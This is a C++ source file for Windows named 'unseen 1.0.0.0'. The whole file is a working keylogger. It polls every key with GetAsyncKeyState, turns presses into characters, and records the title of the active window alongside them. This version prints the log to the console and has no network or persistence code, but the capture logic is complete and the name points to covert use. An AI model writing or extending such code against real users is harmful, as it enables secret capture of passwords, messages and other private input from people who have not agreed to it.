cpp unseen 1.0.0.0\unseen 1.0.0.0.cpp
#include <Windows.h>
#include <iostream>
#include <string>
#include <chrono>
#include <thread>
#include <locale>

int main() {
    // make wide output follow the user's locale (helps printing window titles)
    std::locale::global(std::locale(""));

    bool keyPressed[256] = { false };
    HWND prevWindow = NULL;

    while (true) {
        for (int key = 0; key < 256; key++) {
            SHORT state = GetAsyncKeyState(key);
            if (state & 0x8000) {
                if (!keyPressed[key]) {
                    // Get the currently active window
                    HWND currWindow = GetForegroundWindow();
                    if (currWindow != prevWindow) {
                        wchar_t windowTitle[256] = { 0 };
                        int len = GetWindowTextW(currWindow, windowTitle, _countof(windowTitle));
                        if (len > 0) {
                            std::wcout << L"Window: " << windowTitle << std::endl;
                        }
                        else {
                            std::wcout << L"Window: " << L"(unknown)" << std::endl;
                        }
                        prevWindow = currWindow;
                    }

                    // Translate the virtual-key to a Unicode character (respecting keyboard state)
                    BYTE keyboardState[256];
                    if (!GetKeyboardState(keyboardState)) {
                        // fallback: print virtual-key code if keyboard state couldn't be retrieved
                        std::wcout << L"Key pressed (VK): " << key << std::endl;
                    }
                    else {
                        // Get scan code for ToUnicode
                        UINT scanCode = MapVirtualKeyW((UINT)key, MAPVK_VK_TO_VSC);
                        wchar_t uniChar[8] = { 0 };
                        int ret = ToUnicode((UINT)key, scanCode, keyboardState, uniChar, _countof(uniChar), 0);
                        if (ret > 0) {
                            uniChar[ret] = L'\0';
                            std::wcout << L"Key pressed: " << uniChar << std::endl;
                        }
                        else {
                            // Handle special / non-printable keys
                            switch (key) {
                            case VK_SPACE:
                                std::wcout << L"Space" << std::endl;
                                break;
                            case VK_RETURN:
                                std::wcout << L"Enter" << std::endl;
                                break;
                            case VK_SHIFT:
                            case VK_LSHIFT:
                            case VK_RSHIFT:
                                std::wcout << L"Shift" << std::endl;
                                break;
                            case VK_CAPITAL:
                                std::wcout << L"CapsLock" << std::endl;
                                break;
                            case VK_LWIN:
                            case VK_RWIN:
                                std::wcout << L"Windows" << std::endl;
                                break;
                            case VK_CONTROL:
                            case VK_LCONTROL:
                            case VK_RCONTROL:
                                std::wcout << L"Control" << std::endl;
                                break;
                            case VK_MENU: // Alt
                                std::wcout << L"Alt" << std::endl;
                                break;
                            default:
                                std::wcout << L"Key pressed (VK): " << key << std::endl;
                                break;
                            }
                        }
                    }

                    keyPressed[key] = true;
                }
            }
            else {
                keyPressed[key] = false;
            }
        }

        // avoid 100% CPU burn; small sleep yields responsiveness but reduces CPU usage
        std::this_thread::sleep_for(std::chrono::milliseconds(8));
    }

    return 0;
}